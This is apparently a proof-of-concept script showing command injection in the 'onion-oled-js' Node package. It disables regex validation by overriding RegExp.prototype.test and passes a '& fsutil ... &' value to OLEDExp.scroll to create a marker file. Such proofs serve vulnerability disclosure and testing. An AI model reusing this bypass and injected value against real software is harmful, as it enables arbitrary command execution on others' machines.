RegExp.prototype.test = () => true;
const OLEDExp = require('onion-oled-js').OLEDExp;
const fs = require('fs');
const path = './onion-oled-js';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
let file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
console.log(OLEDExp.scroll('& fsutil file createnew onion-oled-js 0 &').finally(() => {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
}));